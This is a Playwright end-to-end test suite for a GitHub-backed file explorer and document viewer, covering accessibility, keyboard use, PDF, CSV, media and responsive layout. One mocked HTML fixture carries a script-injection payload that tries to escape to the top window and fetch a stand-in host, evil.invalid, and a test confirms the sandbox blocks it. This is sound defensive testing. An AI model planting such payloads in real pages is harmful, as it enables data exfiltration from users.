import AxeBuilder from "@axe-core/playwright";
import { readFileSync } from "node:fs";
import { test, expect } from "@playwright/test";
import { setupServer } from "msw/node";
import { http, HttpResponse } from "msw";
const server = setupServer(
  http.get(
    "https://api.github.com/repos/ada/notes/git/blobs/sample-audio",
    () =>
      new HttpResponse(
        new Uint8Array(readFileSync("fixtures/sample-reading-note.wav")),
        { headers: { "Content-Type": "audio/wav" } },
      ),
  ),
  http.get(
    "https://api.github.com/repos/ada/notes/contents/sample-reading.csv",
    () =>
      new HttpResponse(
        Array.from(
          { length: 6001 },
          (_, i) => "Sample chapter " + i + ",12",
        ).join("\n"),
      ),
  ),
  http.get(
    "https://api.github.com/repos/ada/notes/contents/sample-reading.html",
    () =>
      new HttpResponse(
        '<h1>Sample HTML</h1><script>window.top.shelfEscape=true;fetch("https://evil.invalid/leak")</script><img src="https://evil.invalid/leak">',
      ),
  ),
  http.get(
    "https://api.github.com/repos/ada/notes/contents/sample-reading-note.wav",
    () =>
      new HttpResponse(
        new Uint8Array(readFileSync("fixtures/sample-reading-note.wav")),
        { headers: { "Content-Type": "audio/wav" } },
      ),
  ),
  http.get(
    "https://api.github.com/repos/ada/notes/contents/sample-code.ts",
    () => new HttpResponse("// Sample reading queue\nconst nextChapter = 7;"),
  ),
  http.get(
    "https://api.github.com/repos/ada/notes/contents/diagram.svg",
    () =>
      new HttpResponse(
        '<svg xmlns="http://www.w3.org/2000/svg" width="640" height="480"><title>Sample replication</title><text x="20" y="40">Sample diagram</text></svg>',
        { headers: { "Content-Type": "image/svg+xml" } },
      ),
  ),
  http.get("https://api.github.com/repos/ada/notes/commits", () =>
    HttpResponse.json([
      {
        commit: {
          message: "Sample: add reading notes",
          author: { date: "2026-11-15T08:00:00Z" },
        },
      },
    ]),
  ),
  http.get(
    "https://api.github.com/repos/ada/notes/contents/:name",
    ({ params }) =>
      String(params.name).startsWith("lecture-")
        ? new HttpResponse("# Sample lecture reading notes")
        : undefined,
  ),
  http.get(
    "https://api.github.com/repos/ada/notes/contents/complete.pdf",
    () =>
      new HttpResponse(
        new Uint8Array(readFileSync("fixtures/sample-complete.pdf")),
        { headers: { "Content-Type": "application/pdf" } },
      ),
  ),
  http.get(
    "https://api.github.com/repos/ada/notes/contents/distributed-systems.pdf",
    () =>
      new HttpResponse(
        new Uint8Array(readFileSync("fixtures/sample-reading.pdf")),
        { headers: { "Content-Type": "application/pdf" } },
      ),
  ),
  http.get("https://api.github.com/user", () =>
    HttpResponse.json({ login: "ada" }),
  ),
  http.get("https://api.github.com/user/repos", () =>
    HttpResponse.json([
      { full_name: "ada/notes", default_branch: "main", private: true },
    ]),
  ),
  http.get("https://api.github.com/repos/ada/notes/git/trees/main", () =>
    HttpResponse.json({
      tree: [
        {
          path: "sample-reading-note.wav",
          sha: "sample-audio",
          type: "blob",
          mode: "100644",
          size: readFileSync("fixtures/sample-reading-note.wav").length,
        },
        {
          path: "complete.pdf",
          sha: "complete",
          type: "blob",
          mode: "100644",
          size: 4096,
        },
        ...Array.from({ length: 80 }, (_, i) => ({
          path: "lecture-" + String(i + 1).padStart(2, "0") + ".md",
          sha: "lecture-" + i,
          type: "blob",
          mode: "100644",
          size: 2048 + i,
        })),
        {
          path: "distributed-systems.pdf",
          sha: "sample-pdf",
          type: "blob",
          mode: "100644",
          size: 1024,
        },
        {
          path: "operating-systems.md",
          sha: "sample",
          type: "blob",
          mode: "100644",
          size: 1200,
        },
      ],
      truncated: false,
    }),
  ),
  http.get(
    "https://api.github.com/repos/ada/notes/contents/operating-systems.md",
    () =>
      new HttpResponse(
        "# Operating systems\n\nSample reading notes for week three.\n\n[Sample code](sample-code.ts)\n\n![Sample replication diagram](diagram.svg)",
      ),
  ),
);
test.beforeAll(() => server.listen({ onUnhandledFrame: "bypass" }));
test.afterAll(() => server.close());
for (const theme of ["light", "dark"])
  test("Explorer and Viewer " + theme, async ({ page }) => {
    await page.route("https://api.github.com/**", async (route) => {
      const res = await fetch(route.request().url(), {
        headers: route.request().headers(),
      });
      await route.fulfill({
        status: res.status,
        contentType: res.headers.get("content-type") || "application/json",
        body: Buffer.from(await res.arrayBuffer()),
      });
    });
    await page.goto("/#/gh/ada/notes@main/");
    await page.evaluate(
      (theme) => (document.documentElement.dataset.theme = theme),
      theme,
    );
    await page.getByRole("button", { name: "Connect", exact: true }).click();
    await page.getByLabel("GitHub token").fill("sample-token");
    await page.getByRole("button", { name: "Validate token" }).click();
    await page.getByRole("grid").focus();
    await page.keyboard.type("operating");
    await expect(
      page.getByRole("button", { name: "operating-systems.md" }),
    ).toBeVisible();
    await page.screenshot({
      path: "docs/screenshots/explorer-" + theme + ".png",
    });
    await page.getByRole("grid").focus();
    await page.keyboard.press("Space");
    await expect(page.getByRole("dialog")).toBeVisible();
    await page.getByRole("button", { name: "Close", exact: true }).click();
    await page.getByRole("button", { name: "operating-systems.md" }).dblclick();
    await expect(
      page.getByRole("heading", { name: "Operating systems", exact: true }),
    ).toBeVisible();
    await page.screenshot({
      path: "docs/screenshots/viewer-" + theme + ".png",
    });
    await page.evaluate(() => {
      location.hash =
        "#/view/" +
        encodeURIComponent("gh:ada/notes@main/distributed-systems.pdf");
    });
    await expect(page.getByLabel("PDF page", { exact: true })).toHaveAttribute(
      "width",
      "734",
    );
    await page.screenshot({
      path: "docs/screenshots/viewer-pdf-" + theme + ".png",
    });
    const url = page.url();
    await page.reload();
    await page.getByRole("button", { name: "Connect", exact: true }).click();
    await page.getByLabel("GitHub token").fill("sample-token");
    await page.getByRole("button", { name: "Validate token" }).click();
    await expect(page.getByLabel("PDF page", { exact: true })).toBeVisible();
    await expect(page.getByLabel("PDF page", { exact: true })).toHaveAttribute(
      "width",
      "734",
    );
    expect(page.url()).toBe(url);
    expect(
      await page.evaluate(() => localStorage.length + sessionStorage.length),
    ).toBe(0);
  });

async function mockedConnect(
  page: import("@playwright/test").Page,
  hash = "#/gh/ada/notes@main/",
) {
  await page.route("https://api.github.com/**", async (route) => {
    const res = await fetch(route.request().url(), {
      headers: route.request().headers(),
    });
    await route.fulfill({
      status: res.status,
      contentType: res.headers.get("content-type") || "application/json",
      body: Buffer.from(await res.arrayBuffer()),
    });
  });
  await page.goto("/" + hash);
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await page.getByLabel("GitHub token").fill("sample-token");
  await page.getByRole("button", { name: "Validate token" }).click();
  await expect(page.getByRole("grid")).toBeVisible();
}
test("selection, roving focus, typeahead, resize and persisted sort", async ({
  page,
}) => {
  await mockedConnect(page);
  const grid = page.getByRole("grid");
  const row = grid.locator('[data-index="0"]');
  await row.click();
  await expect(row).toHaveAttribute("aria-selected", "true");
  await page.keyboard.press("Shift+ArrowDown");
  await expect(grid.locator('[aria-selected="true"]')).toHaveCount(2);
  await page.keyboard.press("Control+a");
  await expect(
    page.getByRole("status").filter({ hasText: "Selected files:" }),
  ).toContainText("83");
  await page.keyboard.press("Home");
  await page.keyboard.type("lecture-40");
  await expect(grid.locator('[data-index="41"]')).toBeFocused();
  await page.keyboard.press("Space");
  await expect(page.getByRole("dialog")).toBeVisible();
  await page.getByRole("button", { name: "Close", exact: true }).click();
  const resize = page.getByRole("separator", { name: "Resize Name" });
  await resize.focus();
  const before = Number(await resize.getAttribute("aria-valuenow"));
  await page.keyboard.press("ArrowRight");
  await expect(resize).toHaveAttribute("aria-valuenow", String(before + 8));
  await page
    .getByRole("columnheader")
    .filter({ has: page.getByRole("button", { name: "Size", exact: true }) })
    .getByRole("button")
    .click();
  await page.reload();
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await page.getByLabel("GitHub token").fill("sample-token");
  await page.getByRole("button", { name: "Validate token" }).click();
  await expect(
    page.getByRole("separator", { name: "Resize Name" }),
  ).toHaveAttribute("aria-valuenow", String(before + 8));
  await expect(
    page.getByRole("columnheader", { name: /Size/ }),
  ).toHaveAttribute("aria-sort", "ascending");
});
for (const theme of ["light", "dark"])
  test("M1 panels and PDF controls " + theme, async ({ page }) => {
    await mockedConnect(page);
    await page.evaluate(
      (theme) => (document.documentElement.dataset.theme = theme),
      theme,
    );
    const grid = page.getByRole("grid");
    await grid.locator('[data-index="1"]').click();
    await page.keyboard.press("Shift+ArrowDown");
    await page.getByRole("tab", { name: "Details", exact: true }).click();
    await expect(page.getByRole("tabpanel")).toContainText("Selected files: 2");
    await page.screenshot({
      path: "docs/screenshots/m1-selection-inspector-" + theme + ".png",
    });
    for (const [filter, label] of [
      ["grayscale(1)", "grayscale"],
      ["blur(2px)", "squint"],
    ]) {
      await page.evaluate(
        (filter) => (document.documentElement.style.filter = filter),
        filter,
      );
      await page.screenshot({
        path: "docs/screenshots/m1-selection-" + theme + "-" + label + ".png",
      });
    }
    await page.evaluate(() => (document.documentElement.style.filter = ""));
    await page.keyboard.press("Control+Alt+b");
    await expect(page.getByRole("tablist", { name: "Inspector" })).toHaveCount(
      0,
    );
    await page.keyboard.press("Control+b");
    await expect(page.getByRole("tree")).toHaveCount(0);
    await page.keyboard.press("Control+b");
    await page.keyboard.press("Control+l");
    await expect(
      page.getByRole("textbox", { name: "Address", exact: true }),
    ).toBeFocused();
    await page
      .getByRole("textbox", { name: "Address", exact: true })
      .fill("gh:ada/notes@main/");
    await page.keyboard.press("Enter");
    await page.evaluate(
      () =>
        (location.hash =
          "#/view/" + encodeURIComponent("gh:ada/notes@main/complete.pdf")),
    );
    const reader = page.getByRole("region", { name: "PDF reader" });
    await expect(reader.getByLabel("Page", { exact: true })).toHaveValue("1");
    await reader.getByLabel("PDF sidebar").selectOption("outline");
    await reader.getByRole("button", { name: "Chapter Seven" }).click();
    await expect(reader.getByLabel("Page", { exact: true })).toHaveValue("7");
    await reader.getByLabel("Search in PDF").fill("needle phrase");
    await reader.getByRole("button", { name: "Find", exact: true }).click();
    await expect(reader.locator("mark")).toContainText(["needle phrase"]);
    await reader.getByLabel("Zoom percent").fill("150");
    await reader.getByLabel("Zoom percent").press("Tab");
    await expect(reader.getByLabel("Zoom percent")).toHaveValue("150");
    await reader.getByRole("button", { name: "Fit page", exact: true }).click();
    await reader.getByLabel("PDF sidebar").selectOption("thumbnails");
    await expect(
      reader.getByRole("button", { name: "Page 7", exact: true }),
    ).toBeVisible();
    await reader.getByLabel("Page mode").selectOption("continuous");
    await reader.getByLabel("Page", { exact: true }).fill("12");
    await expect(reader.locator('[data-pdf-page="12"]')).toBeInViewport();
    expect(
      await reader.locator('canvas[width]:not([width="0"])').count(),
    ).toBeLessThan(24);
    await expect(reader.locator('[data-pdf-page="1"] canvas')).toHaveAttribute(
      "width",
      "0",
    );
    await reader.getByLabel("Page mode").selectOption("single");
    await reader.focus();
    await page.keyboard.press("k");
    await expect(reader.getByLabel("Page", { exact: true })).toHaveValue("11");
    await page.keyboard.press("j");
    await page.keyboard.type("g7");
    await page.keyboard.press("Enter");
    await expect(reader.getByLabel("Page", { exact: true })).toHaveValue("7");
    await page.keyboard.press("/");
    await expect(reader.getByLabel("Search in PDF")).toBeFocused();
    await reader.getByLabel("Page", { exact: true }).fill("7");
    await reader.getByLabel("Zoom percent").fill("125");
    await page.evaluate(() => {
      window.scrollTo(0, 0);
      document.getElementById("fileList")?.scrollTo(0, 0);
    });
    await page.screenshot({
      path: "docs/screenshots/m1-pdf-" + theme + ".png",
    });
    const violations = (
      await new AxeBuilder({ page }).analyze()
    ).violations.filter((v) =>
      ["serious", "critical"].includes(v.impact || ""),
    );
    expect(violations).toEqual([]);
    await page.reload();
    await page.getByRole("button", { name: "Connect", exact: true }).click();
    await page.getByLabel("GitHub token").fill("sample-token");
    await page.getByRole("button", { name: "Validate token" }).click();
    await expect(page.getByLabel("Page", { exact: true })).toHaveValue("7");
    await expect(page.getByLabel("Zoom percent")).toHaveValue("125");
  });
for (const theme of ["light", "dark"])
  test(
    "360px drawer, bottom sheet and selection " + theme,
    async ({ page }) => {
      await page.setViewportSize({ width: 360, height: 800 });
      await mockedConnect(page);
      await page.evaluate(
        (theme) => (document.documentElement.dataset.theme = theme),
        theme,
      );
      await page
        .getByRole("button", { name: "Locations", exact: true })
        .click();
      await expect(
        page.getByRole("dialog", { name: "Locations" }),
      ).toBeVisible();
      await page.keyboard.press("Escape");
      await expect(page.getByRole("dialog")).toHaveCount(0);
      await page.getByRole("button", { name: "Selection mode" }).click();
      await page.getByRole("grid").locator('[data-index="1"]').click();
      await page
        .getByRole("button", { name: "Inspector", exact: true })
        .click();
      await expect(
        page.getByRole("dialog", { name: "Inspector" }),
      ).toBeVisible();
      await page.getByRole("tab", { name: "Details", exact: true }).click();
      await page.screenshot({
        path: "docs/screenshots/m1-mobile-" + theme + ".png",
      });
      expect(
        await page.evaluate(
          () => document.documentElement.scrollWidth <= innerWidth,
        ),
      ).toBe(true);
      expect(
        (await new AxeBuilder({ page }).analyze()).violations.filter((v) =>
          ["serious", "critical"].includes(v.impact || ""),
        ),
      ).toEqual([]);
      await page.keyboard.press("Escape");
      await expect(page.getByRole("dialog")).toHaveCount(0);
      await page.screenshot({
        path: "docs/screenshots/m1-mobile-list-" + theme + ".png",
      });
      await page.getByRole("button", { name: "Open", exact: true }).click();
      const reader = page.getByRole("region", {
        name: "PDF reader",
        exact: true,
      });
      await expect(reader.locator("details")).not.toHaveAttribute("open");
      await reader.locator("summary").click();
      await reader
        .getByRole("button", { name: "Fit width", exact: true })
        .click();
      await expect(reader.locator("details")).not.toHaveAttribute("open");
      await expect(
        reader.getByLabel("PDF page", { exact: true }),
      ).toBeVisible();
      await expect
        .poll(async () =>
          Number(
            await reader
              .getByLabel("PDF page", { exact: true })
              .getAttribute("width"),
          ),
        )
        .toBeLessThan(360);
      await expect(reader.locator('[data-pdf-page="1"]')).toHaveAttribute(
        "data-rendered",
        "true",
      );
      await expect(reader.locator("summary")).toBeFocused();
      await expect
        .poll(() =>
          reader
            .getByLabel("PDF page", { exact: true })
            .evaluate((canvas: HTMLCanvasElement) => {
              const pixels = canvas
                .getContext("2d")!
                .getImageData(0, 0, canvas.width, canvas.height).data;
              for (let i = 0; i < pixels.length; i += 4) {
                if (
                  pixels[i + 3] > 0 &&
                  (pixels[i] < 200 ||
                    pixels[i + 1] < 200 ||
                    pixels[i + 2] < 200)
                )
                  return true;
              }
              return false;
            }),
        )
        .toBe(true);
      await expect(
        reader.locator('[data-pdf-page="1"] span').first(),
      ).toBeInViewport();
      await page.screenshot({
        path: "docs/screenshots/m1-mobile-pdf-" + theme + ".png",
      });
    },
  );

async function tabTo(
  page: import("@playwright/test").Page,
  target: import("@playwright/test").Locator,
) {
  for (let i = 0; i < 60; i++) {
    if (await target.evaluate((el) => el === document.activeElement)) return;
    await page.keyboard.press("Tab");
  }
  throw new Error("Keyboard could not reach target");
}
test("keyboard-only connect, browse, Quick Look, tree, address, parent and history", async ({
  page,
}) => {
  await page.route("https://api.github.com/**", async (route) => {
    const res = await fetch(route.request().url(), {
      headers: route.request().headers(),
    });
    await route.fulfill({
      status: res.status,
      contentType: res.headers.get("content-type") || "application/json",
      body: Buffer.from(await res.arrayBuffer()),
    });
  });
  await page.goto("/#/gh/ada/notes@main/");
  await tabTo(page, page.getByRole("button", { name: "Connect", exact: true }));
  await page.keyboard.press("Enter");
  await tabTo(page, page.getByLabel("GitHub token"));
  await page.keyboard.type("sample-token");
  await page.keyboard.press("Tab");
  await page.keyboard.press("Enter");
  await expect(page.getByRole("grid")).toBeVisible();
  await tabTo(
    page,
    page.getByRole("treeitem", { name: "GitHub", exact: true }),
  );
  await page.keyboard.press("ArrowDown");
  await expect(page.getByRole("treeitem", { name: "ada/notes" })).toBeFocused();
  await page.keyboard.press("Home");
  await expect(
    page.getByRole("treeitem", { name: "GitHub", exact: true }),
  ).toBeFocused();
  await page.keyboard.press("End");
  await page.keyboard.press("Enter");
  await tabTo(page, page.getByRole("grid").locator('[data-index="0"]'));
  await page.keyboard.press("ArrowDown");
  await page.keyboard.press("Home");
  await page.keyboard.press("Space");
  await expect(page.getByRole("dialog")).toBeVisible();
  await page.keyboard.press("Escape");
  await expect(
    page.getByRole("grid").locator('[data-index="0"]'),
  ).toBeFocused();
  await page.keyboard.press("Enter");
  await expect(page.getByRole("region", { name: "PDF reader" })).toBeVisible();
  await page.keyboard.press("Backspace");
  await expect(page.getByRole("grid")).toBeVisible();
  await page.keyboard.press("Alt+ArrowLeft");
  await expect(page.getByRole("region", { name: "PDF reader" })).toBeVisible();
  await page.keyboard.press("Alt+ArrowRight");
  await expect(page.getByRole("grid")).toBeVisible();
  await page.keyboard.press("Control+l");
  await expect(
    page.getByRole("textbox", { name: "Address", exact: true }),
  ).toBeFocused();
  await page.keyboard.press("Escape");
  await page.keyboard.press("Alt+ArrowUp");
  await expect(page.getByRole("grid")).toBeVisible();
});
test("all four responsive bands and Explorer axe", async ({ page }) => {
  await mockedConnect(page);
  for (const width of [1440, 1024, 768, 360]) {
    await page.setViewportSize({ width, height: 900 });
    if (width >= 900) await expect(page.getByRole("tree")).toBeVisible();
    else await expect(page.getByRole("tree")).toHaveCount(0);
    if (width >= 1200)
      await expect(
        page.getByRole("tablist", { name: "Inspector" }),
      ).toBeVisible();
    else
      await expect(
        page.getByRole("tablist", { name: "Inspector" }),
      ).toHaveCount(0);
    if (width >= 640 && width < 900)
      await expect(
        page.getByRole("button", { name: "Open Locations" }),
      ).toBeVisible();
    expect(
      (await new AxeBuilder({ page }).analyze()).violations.filter((v) =>
        ["serious", "critical"].includes(v.impact || ""),
      ),
    ).toEqual([]);
  }
});
test("pointer range selection and Ctrl toggle", async ({ page }) => {
  await mockedConnect(page);
  const grid = page.getByRole("grid");
  const box = await grid
    .locator('[data-index="1"] [role="gridcell"]')
    .nth(2)
    .boundingBox();
  if (!box) throw new Error("Missing selection cell");
  await page.mouse.move(box.x + box.width - 8, box.y + 8);
  await page.mouse.down();
  await page.mouse.move(box.x + box.width - 30, box.y + 8 + 96, { steps: 6 });
  await expect(grid.locator("[data-selection-box]")).toBeVisible();
  await page.mouse.up();
  await expect(grid.locator('[role="row"][aria-selected="true"]')).toHaveCount(
    4,
  );
  await grid.locator('[data-index="1"]').click({ modifiers: ["Control"] });
  await expect(grid.locator('[role="row"][aria-selected="true"]')).toHaveCount(
    3,
  );
});

test.describe("touch selection", () => {
  test.use({ hasTouch: true });
  test("long press selects without a second tap undoing it", async ({
    page,
  }) => {
    await page.setViewportSize({ width: 360, height: 800 });
    await mockedConnect(page);
    const row = page.getByRole("grid").locator('[data-index="1"]');
    const box = await row.boundingBox();
    if (!box) throw new Error("Missing touch row");
    const cdp = await page.context().newCDPSession(page);
    await cdp.send("Input.dispatchTouchEvent", {
      type: "touchStart",
      touchPoints: [{ x: box.x + 60, y: box.y + 20 }],
    });
    await expect(
      page.getByRole("button", { name: "Selection mode" }),
    ).toHaveAttribute("aria-pressed", "true");
    await cdp.send("Input.dispatchTouchEvent", {
      type: "touchEnd",
      touchPoints: [],
    });
    await expect(row).toHaveAttribute("aria-selected", "true");
    await cdp.detach();
  });
});

test.describe("200 percent layout simulation", () => {
  test.use({ viewport: { width: 720, height: 500 }, deviceScaleFactor: 2 });
  for (const theme of ["light", "dark"])
    test("Explorer 200 percent reflow " + theme, async ({ page }) => {
      await mockedConnect(page);
      await page.evaluate(
        (theme) => (document.documentElement.dataset.theme = theme),
        theme,
      );
      expect(
        await page.evaluate(
          () => document.documentElement.scrollWidth <= innerWidth,
        ),
      ).toBe(true);
      expect(
        (await page.getByRole("grid").boundingBox())?.height,
      ).toBeGreaterThan(64);
      await page.getByRole("grid").focus();
      await page.keyboard.press("Control+a");
      await expect(
        page.getByRole("status").filter({ hasText: "Selected files:" }),
      ).toContainText("83");
      await page.screenshot({
        path: "docs/screenshots/m1-zoom-200-" + theme + ".png",
      });
    });
});
test("same-provider Markdown assets and code/image controls", async ({
  page,
}) => {
  await mockedConnect(page);
  await page.evaluate(
    () =>
      (location.hash =
        "#/view/" +
        encodeURIComponent("gh:ada/notes@main/operating-systems.md")),
  );
  await expect(
    page.getByRole("img", { name: "Sample replication diagram" }),
  ).toBeVisible();
  await page.getByRole("link", { name: "Sample code", exact: true }).click();
  await expect(page.getByRole("button", { name: "Wrap text" })).toBeVisible();
  await expect(
    page.locator("code").filter({ hasText: "const nextChapter = 7;" }),
  ).toBeVisible();
  await page.getByRole("button", { name: "Wrap text" }).click();
  await expect(page.getByRole("button", { name: "Wrap text" })).toHaveAttribute(
    "aria-pressed",
    "true",
  );
  await page.evaluate(
    () =>
      (location.hash =
        "#/view/" + encodeURIComponent("gh:ada/notes@main/diagram.svg")),
  );
  await expect(page.getByRole("img", { name: "diagram.svg" })).toBeVisible();
  await page.getByRole("button", { name: "100%", exact: true }).click();
  await page.getByRole("button", { name: "Zoom in", exact: true }).click();
  await expect(page.getByRole("img", { name: "diagram.svg" })).toHaveCSS(
    "zoom",
    "1.25",
  );
  expect(
    (await new AxeBuilder({ page }).analyze()).violations.filter((v) =>
      ["serious", "critical"].includes(v.impact || ""),
    ),
  ).toEqual([]);
});

test("CSV pagination, inert HTML sandbox and native media", async ({
  page,
}) => {
  await mockedConnect(page);
  await page.getByRole("button", { name: "Inspector", exact: true }).click();
  await page.evaluate(
    () =>
      (location.hash =
        "#/view/" + encodeURIComponent("gh:ada/notes@main/sample-reading.csv")),
  );
  await expect(page.getByText("Rows shown: 5000 / 6001")).toBeVisible();
  expect(await page.getByRole("table").getByRole("row").count()).toBeLessThan(
    100,
  );
  await page.getByRole("button", { name: "Open all rows" }).click();
  await expect(page.getByText("Rows shown: 6001 / 6001")).toBeVisible();
  const external: string[] = [];
  page.on("request", (r) => {
    if (new URL(r.url()).hostname === "evil.invalid") external.push(r.url());
  });
  await page.evaluate(
    () =>
      (location.hash =
        "#/view/" +
        encodeURIComponent("gh:ada/notes@main/sample-reading.html")),
  );
  await expect(page.locator("iframe")).toHaveCount(0);
  await page.getByRole("button", { name: "Run preview", exact: true }).click();
  await expect(
    page.frameLocator("iframe").getByRole("heading", { name: "Sample HTML" }),
  ).toBeVisible();
  expect(await page.evaluate(() => "shelfEscape" in window)).toBe(false);
  expect(external).toEqual([]);
  await page.evaluate(
    () =>
      (location.hash =
        "#/view/" +
        encodeURIComponent("gh:ada/notes@main/sample-reading-note.wav")),
  );
  const media = page.getByRole("region", {
    name: "Media player: sample-reading-note.wav",
    exact: true,
  });
  await expect(media.locator("audio")).toHaveAttribute("controls", "");
  await expect
    .poll(() =>
      media
        .locator("audio")
        .evaluate((node: HTMLAudioElement) => node.duration),
    )
    .toBe(2);
  await media.focus();
  await page.keyboard.press("Space");
  await expect
    .poll(() =>
      media.locator("audio").evaluate((node: HTMLAudioElement) => node.paused),
    )
    .toBe(false);
  await page.keyboard.press("Space");
  await expect
    .poll(() =>
      media.locator("audio").evaluate((node: HTMLAudioElement) => node.paused),
    )
    .toBe(true);
});
